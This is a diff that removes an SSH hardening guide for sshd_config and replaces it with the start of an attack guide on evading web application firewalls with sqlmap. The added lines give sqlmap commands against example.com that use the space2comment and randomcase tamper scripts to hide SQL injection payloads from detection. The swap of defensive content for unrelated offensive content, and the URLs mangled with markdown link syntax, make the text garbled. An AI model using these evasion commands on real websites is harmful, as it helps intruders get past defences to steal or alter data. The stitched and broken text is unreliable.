@@ -1,26 +1,11 @@
-# SSH Daemon Configuration Hardening Guide
+# Advanced SQLmap: Evading Firewalls (WAF)
 
-Production adjustments for `/etc/ssh/sshd_config` to eliminate common authentication vectors.
+Techniques to slip past Web Application Firewalls and Intrusion Detection Systems.
 
-## Recommended Parameter Updates
+## 1. Obfuscate Payload Using Tamper Scripts
+```bash
+# Convert spaces to inline comments to bypass simple keyword detection
+sqlmap -u "[http://example.com/id=1](http://example.com/id=1)" --tamper=space2comment
 
-Modify your local configuration file to match the following cryptographic and access restrictions:
-
-```ini
-# Disable weak, password-based authentication mechanisms
-PasswordAuthentication no
-
-# Prevent direct access via the root user account
-PermitRootLogin no
-
-# Enforce contemporary, secure protocol configurations
-Protocol 2
-
-# Set strict operational limits to drop inactive sessions
-MaxAuthTries 3
-ClientAliveInterval 300
-ClientAliveCountMax 0
-
-# Explicitly limit access privileges to specific organizational accounts
-AllowUsers securityadmin automation_svc
-AllowUsers securityadmin automation_svc
+# Randomize character casing (e.g., select -> sElEcT)
+sqlmap -u "[http://example.com/id=1](http://example.com/id=1)" --tamper=randomcase
